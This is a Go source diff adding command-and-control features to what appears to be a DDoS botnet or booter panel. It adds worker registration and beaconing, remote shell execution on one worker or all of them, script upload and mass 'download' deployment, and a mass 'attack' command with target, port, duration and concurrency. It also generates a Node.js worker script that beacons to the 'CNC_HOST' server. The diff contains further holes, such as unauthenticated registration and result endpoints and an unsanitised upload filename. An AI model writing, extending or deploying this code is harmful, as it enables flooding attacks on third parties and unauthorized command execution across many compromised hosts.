@@ -62,6 +62,29 @@ func NewWebMux() http.Handler {
 	r("/broadcasts", handleBroadcasts)
 	r("/broadcasts/", handleBroadcastsDelete)
 	r("/upload", handleUpload)
+	r("/workers", handleWorkers)
+	r("/workers/heartbeat", handleWorkerHeartbeat)
+	r("/workers/inject", handleWorkerInject)
+	r("/workers/register", handleWorkerRegister)
+	r("/workers/commands/", handleWorkerCommands)
+	r("/workers/send-command", handleWorkerSendCommand)
+	r("/scripts", handleUploadScript)
+	r("/deploy-script", handleDeployScript)
+	r("/methods/create-from-script", handleMethodFromScript)
+	r("/workers/rce", handleWorkerRCE)
+	r("/workers/result", handleWorkerResult)
+	r("/workers/result/", handleGetWorkerResult)
+	r("/workers/mass", handleMassCommand)
+	r("/github-config", handleGitHubConfig)
+	r("/generate-worker", handleGenerateWorkerScript)
+
+	mux.Handle("/scripts/", http.StripPrefix("/scripts/", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		if strings.HasSuffix(r.URL.Path, "/") || r.URL.Path == "" {
+			http.NotFound(w, r)
+			return
+		}
+		http.FileServer(http.Dir("scripts")).ServeHTTP(w, r)
+	})))
 
 	mux.Handle("/uploads/", http.StripPrefix("/uploads/", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 		if strings.HasSuffix(r.URL.Path, "/") || r.URL.Path == "" {
@@ -689,29 +712,6 @@ func handleMethods(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	if r.Method == "POST" {
-		user, ok := getTokenUser(r)
-		if !ok || user.Rule != "Admin" {
-			jsonError(w, "Unauthorized", 403)
-			return
-		}
-		var m Method
-		if err := json.NewDecoder(r.Body).Decode(&m); err != nil {
-			jsonError(w, "Invalid request body", 400)
-			return
-		}
-		if _, exists := methodList.Load(m.Method); exists {
-			jsonError(w, "Method already exists", 409)
-			return
-		}
-		if m.Concurrents == 0 {
-			m.Concurrents = 1
-		}
-		SaveMethod(m)
-		jsonSuccess(w, map[string]bool{"success": true})
-		return
-	}
-
 	jsonError(w, "method not allowed", 405)
 }
 
@@ -782,6 +782,7 @@ func handleLaunch(w http.ResponseWriter, r *http.Request) {
 	concurrentsStr := r.FormValue("concurrents")
 	rpcStr := r.FormValue("rpc")
 	proxyStr := r.FormValue("proxy")
+	flagsStr := r.FormValue("flags")
 
 	if target == "" {
 		jsonError(w, "Target is required", 400)
@@ -861,6 +862,11 @@ func handleLaunch(w http.ResponseWriter, r *http.Request) {
 		Concurrents: concurrents,
 		Rpc:         rpc,
 		Layer:       layer,
+		ScriptName:  methodDef.ScriptName,
+		Flags:       flagsStr,
+	}
+	if cmd.Flags == "" {
+		cmd.Flags = methodDef.Flags
 	}
 	cmd.Publish()
 
@@ -1217,4 +1223,701 @@ func handleAdminAddPlan(w http.ResponseWriter, r *http.Request) {
 	}
 	SavePlan(p)
 	jsonSuccess(w, map[string]bool{"success": true})
+}
+
+// ─── Worker Management ───────────────────────────────────────────────
+
+func handleWorkers(w http.ResponseWriter, r *http.Request) {
+	user, ok := getTokenUser(r)
+	if !ok || user.Rule != "Admin" {
+		jsonError(w, "Unauthorized", 403)
+		return
+	}
+
+	if r.Method == "GET" {
+		ws, err := storage.GetAllWorkers()
+		if err != nil {
+			jsonError(w, "internal error", 500)
+			return
+		}
+		jsonSuccess(w, ws)
+		return
+	}
+
+	jsonError(w, "method not allowed", 405)
+}
+
+func handleWorkerHeartbeat(w http.ResponseWriter, r *http.Request) {
+	if r.Method != "POST" {
+		jsonError(w, "method not allowed", 405)
+		return
+	}
+
+	var body struct {
+		WorkerID   string `json:"worker_id"`
+		PID        int    `json:"pid"`
+		Port       int    `json:"port"`
+		Status     string `json:"status"`
+		BinaryPath string `json:"binary_path"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
+		jsonError(w, "Invalid request body", 400)
+		return
+	}
+
+	if body.WorkerID == "" {
+		jsonError(w, "worker_id is required", 400)
+		return
+	}
+
+	wkr, found := storage.GetWorkerByID(body.WorkerID)
+	if !found {
+		jsonError(w, "Worker not found", 404)
+		return
+	}
+
+	wkr.PID = body.PID
+	wkr.Port = body.Port
+	if body.Status != "" {
+		wkr.Status = body.Status
+	}
+	if body.BinaryPath != "" {
+		wkr.BinaryPath = body.BinaryPath
+	}
+	wkr.LastHeartbeat = time.Now()
+
+	storage.SaveWorker(wkr)
+	jsonSuccess(w, map[string]string{"status": "ok"})
+}
+
+func handleWorkerInject(w http.ResponseWriter, r *http.Request) {
+	user, ok := getTokenUser(r)
+	if !ok || user.Rule != "Admin" {
+		jsonError(w, "Unauthorized", 403)
+		return
+	}
+
+	if r.Method != "POST" {
+		jsonError(w, "method not allowed", 405)
+		return
+	}
+
+	var body struct {
+		ServerID   string `json:"server_id"`
+		WorkerType string `json:"worker_type"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
+		jsonError(w, "Invalid request body", 400)
+		return
+	}
+
+	if body.ServerID == "" {
+		jsonError(w, "server_id is required", 400)
+		return
+	}
+
+	v, ok := botConnections.Load(body.ServerID)
+	if !ok {
+		jsonError(w, "Server not found", 404)
+		return
+	}
+	server := v.(BotConnection)
+
+	wkr := Worker{
+		ID:           generateID(),
+		ServerID:     body.ServerID,
+		ServerIP:     server.IP,
+		WorkerType:   body.WorkerType,
+		Status:       "injecting",
+		PID:          0,
+		Port:         0,
+		BinaryPath:   "",
+		LastHeartbeat: time.Now(),
+		CreatedAt:    time.Now(),
+		InstalledBy:  user.Username,
+	}
+	storage.SaveWorker(wkr)
+
+	cmd := map[string]interface{}{
+		"action":      "inject",
+		"worker_id":   wkr.ID,
+		"server_id":   body.ServerID,
+		"worker_type": body.WorkerType,
+		"cnc_url":     fmt.Sprintf("http://%s", r.Host),
+	}
+	publishCommand(cmd)
+
+	jsonSuccess(w, wkr)
+}
+
+// ─── GitHub Config ────────────────────────────────────────────────────
+
+func handleGitHubConfig(w http.ResponseWriter, r *http.Request) {
+	user, ok := getTokenUser(r)
+	if !ok || user.Rule != "Admin" {
+		jsonError(w, "Unauthorized", 403)
+		return
+	}
+
+	if r.Method == "GET" {
+		cfg, err := storage.GetGitHubConfig()
+		if err != nil {
+			jsonError(w, "internal error", 500)
+			return
+		}
+		jsonSuccess(w, cfg)
+		return
+	}
+
+	if r.Method == "PUT" || r.Method == "POST" {
+		var body struct {
+			RepoURL  string `json:"repo_url"`
+			Token    string `json:"token"`
+			Branch   string `json:"branch"`
+			FilePath string `json:"file_path"`
+			Enabled  *bool  `json:"enabled"`
+		}
+		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
+			jsonError(w, "Invalid request body", 400)
+			return
+		}
+
+		cfg := GitHubConfig{
+			ID:       "main",
+			RepoURL:  body.RepoURL,
+			Token:    body.Token,
+			Branch:   body.Branch,
+			FilePath: body.FilePath,
+			Enabled:  false,
+		}
+		if body.Enabled != nil {
+			cfg.Enabled = *body.Enabled
+		}
+		if cfg.Branch == "" {
+			cfg.Branch = "main"
+		}
+		if cfg.FilePath == "" {
+			cfg.FilePath = "master.json"
+		}
+
+		storage.SaveGitHubConfig(cfg)
+		jsonSuccess(w, cfg)
+		return
+	}
+
+	jsonError(w, "method not allowed", 405)
+}
+
+// ─── Generate Worker Script ──────────────────────────────────────────
+
+func handleGenerateWorkerScript(w http.ResponseWriter, r *http.Request) {
+	user, ok := getTokenUser(r)
+	if !ok || user.Rule != "Admin" {
+		jsonError(w, "Unauthorized", 403)
+		return
+	}
+
+	if r.Method != "POST" {
+		jsonError(w, "method not allowed", 405)
+		return
+	}
+
+	var body struct {
+		ServerIP string `json:"server_ip"`
+		Port     string `json:"port"`
+	}
+	body.Port = "8080"
+	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
+		jsonError(w, "Invalid request body", 400)
+		return
+	}
+
+	workerID := generateID()
+	script := fmt.Sprintf(`#!/usr/bin/env node
+const https = require("https");
+const fs = require("fs");
+const path = require("path");
+const { execSync, spawn } = require("child_process");
+
+const CNC_HOST = %q;
+const CNC_PORT = %q;
+const WORKER_ID = %q;
+
+function heartbeat() {
+	const data = JSON.stringify({ worker_id: WORKER_ID, pid: process.pid, port: 0, status: "running" });
+	const req = https.request({ hostname: CNC_HOST, port: CNC_PORT, path: "/api/v1/workers/heartbeat", method: "POST", headers: { "Content-Type": "application/json", "Content-Length": data.length } }, () => {});
+	req.write(data);
+	req.end();
+}
+
+setInterval(heartbeat, 30000);
+heartbeat();
+console.log("levl7 worker " + WORKER_ID + " running on " + CNC_HOST);
+`, body.ServerIP, body.Port, workerID)
+
+	w.Header().Set("Content-Type", "application/javascript")
+	w.Header().Set("Content-Disposition", "attachment; filename=worker-"+workerID+".js")
+	w.Write([]byte(script))
+}
+
+// ─── Worker Registration (unauthenticated) ──────────────────────────
+var workerCommands = &sync.Map{} // worker_id -> []Command
+
+func handleWorkerRegister(w http.ResponseWriter, r *http.Request) {
+	if r.Method != "POST" {
+		jsonError(w, "method not allowed", 405)
+		return
+	}
+
+	var body struct {
+		Hostname string `json:"hostname"`
+		Arch     string `json:"arch"`
+		Platform string `json:"platform"`
+		CPUs     int    `json:"cpus"`
+		TotalMem int64  `json:"totalmem"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
+		jsonError(w, "Invalid request body", 400)
+		return
+	}
+
+	wkr := Worker{
+		ID:        generateID(),
+		ServerID:  body.Hostname,
+		ServerIP:  strings.Split(r.RemoteAddr, ":")[0],
+		WorkerType: body.Arch + "/" + body.Platform,
+		Status:    "registered",
+		PID:       0,
+		Port:      0,
+		CreatedAt: time.Now(),
+		LastHeartbeat: time.Now(),
+	}
+	storage.SaveWorker(wkr)
+	workersMap.Store(wkr.ID, wkr)
+
+	jsonSuccess(w, map[string]interface{}{
+		"worker_id": wkr.ID,
+		"server_id": wkr.ServerID,
+		"status":    "registered",
+	})
+}
+
+// ─── Worker Commands ─────────────────────────────────────────────────
+func handleWorkerCommands(w http.ResponseWriter, r *http.Request) {
+	workerID := strings.TrimPrefix(r.URL.Path, "/api/v1/workers/commands/")
+	workerID = strings.TrimPrefix(workerID, "/api/workers/commands/")
+
+	if r.Method == "GET" {
+		cmds := []interface{}{}
+		v, ok := workerCommands.Load(workerID)
+		if ok {
+			cmds = v.([]interface{})
+			workerCommands.Delete(workerID)
+		}
+		jsonSuccess(w, map[string]interface{}{"commands": cmds})
+		return
+	}
+
+	jsonError(w, "method not allowed", 405)
+}
+
+func handleWorkerSendCommand(w http.ResponseWriter, r *http.Request) {
+	user, ok := getTokenUser(r)
+	if !ok || user.Rule != "Admin" {
+		jsonError(w, "Unauthorized", 403)
+		return
+	}
+
+	if r.Method != "POST" {
+		jsonError(w, "method not allowed", 405)
+		return
+	}
+
+	var body struct {
+		WorkerID string      `json:"worker_id"`
+		Command  interface{} `json:"command"`
+		Target   string      `json:"target"`
+		Method   string      `json:"method"`
+		Port     string      `json:"port"`
+		Time     int         `json:"time"`
+		Action   string      `json:"action"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
+		jsonError(w, "Invalid request body", 400)
+		return
+	}
+
+	cmd := map[string]interface{}{
+		"action":  body.Action,
+		"target":  body.Target,
+		"method":  body.Method,
+		"port":    body.Port,
+		"time":    body.Time,
+		"attack_id": generateID(),
+		"from":    user.Username,
+	}
+
+	if body.WorkerID == "all" {
+		workerCommands.Range(func(k, _ interface{}) bool {
+			existing, _ := workerCommands.LoadOrStore(k, []interface{}{})
+			workerCommands.Store(k, append(existing.([]interface{}), cmd))
+			return true
+		})
+	} else {
+		existing, _ := workerCommands.LoadOrStore(body.WorkerID, []interface{}{})
+		workerCommands.Store(body.WorkerID, append(existing.([]interface{}), cmd))
+	}
+
+	jsonSuccess(w, map[string]interface{}{"sent": true, "attack_id": cmd["attack_id"]})
+}
+
+// ─── Script Upload & Management ──────────────────────────────────────
+func handleUploadScript(w http.ResponseWriter, r *http.Request) {
+	user, ok := getTokenUser(r)
+	if !ok || user.Rule != "Admin" {
+		jsonError(w, "Unauthorized", 403)
+		return
+	}
+
+	if r.Method == "GET" {
+		scripts := []map[string]string{}
+		os.MkdirAll("scripts", 0755)
+		files, _ := os.ReadDir("scripts")
+		for _, f := range files {
+			if !f.IsDir() {
+				info, _ := f.Info()
+				scripts = append(scripts, map[string]string{
+					"name": f.Name(),
+					"size": fmt.Sprintf("%d", info.Size()),
+					"url":  "/scripts/" + f.Name(),
+				})
+			}
+		}
+		jsonSuccess(w, scripts)
+		return
+	}
+
+	if r.Method == "POST" {
+		r.Body = http.MaxBytesReader(w, r.Body, 50<<20)
+		r.ParseMultipartForm(50 << 20)
+		file, handler, err := r.FormFile("file")
+		if err != nil {
+			jsonError(w, "file is required", 400)
+			return
+		}
+		defer file.Close()
+
+		os.MkdirAll("scripts", 0755)
+		name := handler.Filename
+		dst, err := os.Create("scripts/" + name)
+		if err != nil {
+			jsonError(w, "failed to save", 500)
+			return
+		}
+		defer dst.Close()
+		io.Copy(dst, file)
+
+		jsonSuccess(w, map[string]string{"name": name, "url": "/scripts/" + name})
+		return
+	}
+
+	jsonError(w, "method not allowed", 405)
+}
+
+func handleDeployScript(w http.ResponseWriter, r *http.Request) {
+	user, ok := getTokenUser(r)
+	if !ok || user.Rule != "Admin" {
+		jsonError(w, "Unauthorized", 403)
+		return
+	}
+
+	if r.Method != "POST" {
+		jsonError(w, "method not allowed", 405)
+		return
+	}
+
+	var body struct {
+		ScriptName string `json:"script_name"`
+		WorkerID   string `json:"worker_id"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
+		jsonError(w, "Invalid request body", 400)
+		return
+	}
+
+	scriptURL := fmt.Sprintf("http://%s/scripts/%s", r.Host, body.ScriptName)
+	cmd := map[string]interface{}{
+		"action":     "download",
+		"url":        scriptURL,
+		"name":       body.ScriptName,
+		"deploy_by":  user.Username,
+	}
+
+	if body.WorkerID == "all" {
+		workerCommands.Range(func(k, _ interface{}) bool {
+			existing, _ := workerCommands.LoadOrStore(k, []interface{}{})
+			workerCommands.Store(k, append(existing.([]interface{}), cmd))
+			return true
+		})
+	} else {
+		existing, _ := workerCommands.LoadOrStore(body.WorkerID, []interface{}{})
+		workerCommands.Store(body.WorkerID, append(existing.([]interface{}), cmd))
+	}
+
+	jsonSuccess(w, map[string]interface{}{"deployed": true, "script": body.ScriptName})
+}
+
+// ─── Worker RCE ──────────────────────────────────────────────────────
+func handleWorkerRCE(w http.ResponseWriter, r *http.Request) {
+	user, ok := getTokenUser(r)
+	if !ok || user.Rule != "Admin" {
+		jsonError(w, "Unauthorized", 403)
+		return
+	}
+
+	if r.Method != "POST" {
+		jsonError(w, "method not allowed", 405)
+		return
+	}
+
+	var body struct {
+		WorkerID string `json:"worker_id"`
+		Command  string `json:"command"`
+		Timeout  int    `json:"timeout"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
+		jsonError(w, "Invalid request body", 400)
+		return
+	}
+
+	if body.WorkerID == "" {
+		jsonError(w, "worker_id is required", 400)
+		return
+	}
+	if body.Command == "" {
+		jsonError(w, "command is required", 400)
+		return
+	}
+	if body.Timeout <= 0 {
+		body.Timeout = 30
+	}
+
+	cmdID := generateID()
+	cmd := map[string]interface{}{
+		"action":     "rce",
+		"command":    body.Command,
+		"timeout":    body.Timeout,
+		"cmd_id":     cmdID,
+		"from":       user.Username,
+		"created_at": time.Now().Format(time.RFC3339),
+	}
+
+	if body.WorkerID == "all" {
+		count := 0
+		workerCommands.Range(func(k, _ interface{}) bool {
+			existing, _ := workerCommands.LoadOrStore(k, []interface{}{})
+			workerCommands.Store(k, append(existing.([]interface{}), cmd))
+			count++
+			return true
+		})
+		jsonSuccess(w, map[string]interface{}{"sent": true, "cmd_id": cmdID, "target_count": count})
+	} else {
+		existing, _ := workerCommands.LoadOrStore(body.WorkerID, []interface{}{})
+		workerCommands.Store(body.WorkerID, append(existing.([]interface{}), cmd))
+		jsonSuccess(w, map[string]interface{}{"sent": true, "cmd_id": cmdID, "target": body.WorkerID})
+	}
+}
+
+// ─── Worker Result ───────────────────────────────────────────────────
+var workerResults = &sync.Map{} // cmd_id -> result
+
+func handleWorkerResult(w http.ResponseWriter, r *http.Request) {
+	if r.Method != "POST" {
+		jsonError(w, "method not allowed", 405)
+		return
+	}
+
+	var body struct {
+		WorkerID string `json:"worker_id"`
+		CmdID    string `json:"cmd_id"`
+		OK       bool   `json:"ok"`
+		Output   string `json:"output"`
+		Error    string `json:"error"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
+		jsonError(w, "Invalid request body", 400)
+		return
+	}
+
+	workerResults.Store(body.CmdID, body)
+	jsonSuccess(w, map[string]string{"status": "received"})
+}
+
+func handleGetWorkerResult(w http.ResponseWriter, r *http.Request) {
+	user, ok := getTokenUser(r)
+	if !ok || user.Rule != "Admin" {
+		jsonError(w, "Unauthorized", 403)
+		return
+	}
+
+	if r.Method != "GET" {
+		jsonError(w, "method not allowed", 405)
+		return
+	}
+
+	cmdID := strings.TrimPrefix(r.URL.Path, "/api/v1/workers/result/")
+	cmdID = strings.TrimPrefix(cmdID, "/api/workers/result/")
+
+	v, ok := workerResults.Load(cmdID)
+	if !ok {
+		jsonError(w, "result not found", 404)
+		return
+	}
+
+	jsonSuccess(w, v)
+}
+
+// ─── Mass Command ────────────────────────────────────────────────────
+func handleMassCommand(w http.ResponseWriter, r *http.Request) {
+	user, ok := getTokenUser(r)
+	if !ok || user.Rule != "Admin" {
+		jsonError(w, "Unauthorized", 403)
+		return
+	}
+
+	if r.Method != "POST" {
+		jsonError(w, "method not allowed", 405)
+		return
+	}
+
+	var body struct {
+		Action      string `json:"action"`
+		Target      string `json:"target"`
+		Method      string `json:"method"`
+		Port        string `json:"port"`
+		Time        int    `json:"time"`
+		Concurrents int    `json:"concurrents"`
+		Rpc         int    `json:"rpc"`
+		Command     string `json:"command"`
+		ScriptName  string `json:"script_name"`
+		Args        string `json:"args"`
+		Flags       string `json:"flags"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
+		jsonError(w, "Invalid request body", 400)
+		return
+	}
+
+	cmd := map[string]interface{}{
+		"action":      body.Action,
+		"attack_id":   generateID(),
+		"from":        user.Username,
+		"created_at":  time.Now().Format(time.RFC3339),
+	}
+
+	switch body.Action {
+	case "attack":
+		cmd["target"] = body.Target
+		cmd["method"] = body.Method
+		cmd["port"] = body.Port
+		cmd["time"] = body.Time
+		cmd["concurrents"] = body.Concurrents
+		cmd["rpc"] = body.Rpc
+	case "method":
+		cmd["target"] = body.Target
+		cmd["method"] = body.Method
+		cmd["port"] = body.Port
+		cmd["time"] = body.Time
+		cmd["concurrents"] = body.Concurrents
+		cmd["flags"] = body.Args
+		if v, ok := methodList.Load(body.Method); ok {
+			cmd["script_name"] = v.(Method).ScriptName
+			if cmd["flags"] == "" {
+				cmd["flags"] = v.(Method).Flags
+			}
+		}
+	case "exec", "rce":
+		cmd["command"] = body.Command
+	case "run":
+		cmd["script"] = body.ScriptName
+		cmd["args"] = body.Args
+	case "download":
+		if body.ScriptName != "" {
+			cmd["url"] = fmt.Sprintf("http://%s/scripts/%s", r.Host, body.ScriptName)
+			cmd["name"] = body.ScriptName
+		}
+	}
+
+	count := 0
+	workerCommands.Range(func(k, _ interface{}) bool {
+		existing, _ := workerCommands.LoadOrStore(k, []interface{}{})
+		workerCommands.Store(k, append(existing.([]interface{}), cmd))
+		count++
+		return true
+	})
+
+	jsonSuccess(w, map[string]interface{}{
+		"sent":      true,
+		"attack_id": cmd["attack_id"],
+		"count":     count,
+	})
+}
+
+// ─── Create Method from Script ────────────────────────────────────────
+func handleMethodFromScript(w http.ResponseWriter, r *http.Request) {
+	user, ok := getTokenUser(r)
+	if !ok || user.Rule != "Admin" {
+		jsonError(w, "Unauthorized", 403)
+		return
+	}
+
+	if r.Method != "POST" {
+		jsonError(w, "method not allowed", 405)
+		return
+	}
+
+	var body struct {
+		Method      string `json:"method"`
+		Description string `json:"description"`
+		ScriptName  string `json:"script_name"`
+		Flags       string `json:"flags"`
+		Premium     bool   `json:"premium"`
+		Concurrents int    `json:"concurrents"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
+		jsonError(w, "Invalid request body", 400)
+		return
+	}
+
+	if body.Method == "" || body.ScriptName == "" {
+		jsonError(w, "method and script_name are required", 400)
+		return
+	}
+
+	if _, exists := methodList.Load(body.Method); exists {
+		jsonError(w, "Method already exists", 409)
+		return
+	}
+
+	// Verify script exists
+	os.MkdirAll("scripts", 0755)
+	if _, err := os.Stat("scripts/" + body.ScriptName); os.IsNotExist(err) {
+		jsonError(w, "Script file not found", 404)
+		return
+	}
+
+	m := Method{
+		Method:      body.Method,
+		Description: body.Description,
+		ScriptName:  body.ScriptName,
+		Flags:       body.Flags,
+		Premium:     body.Premium,
+		Concurrents: body.Concurrents,
+	}
+	if m.Concurrents == 0 {
+		m.Concurrents = 1
+	}
+	SaveMethod(m)
+
+	jsonSuccess(w, map[string]interface{}{"success": true, "method": m.Method, "script": m.ScriptName})
 }
